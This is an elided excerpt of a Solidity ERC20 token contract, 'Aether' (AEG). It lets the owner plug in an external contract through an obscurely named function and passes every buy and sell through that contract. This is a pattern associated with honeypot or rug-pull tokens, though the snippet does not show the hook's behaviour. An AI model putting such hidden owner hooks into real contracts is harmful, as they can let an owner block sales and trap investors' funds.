...
contract TokenM is ERC20 {
    ...
    IUserAmountoninge public oninge;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Aether", "AEG") {
    ...
    function ckoiuferBdkingRooc(IUserAmountoninge _oninge) public onlyOwner {
        oninge = _oninge;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                oninge.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				oninge.addOutAmount(from, amount);
            }else{
                oninge.addOutAmount(from, amount);
                takeFee = false;
            }
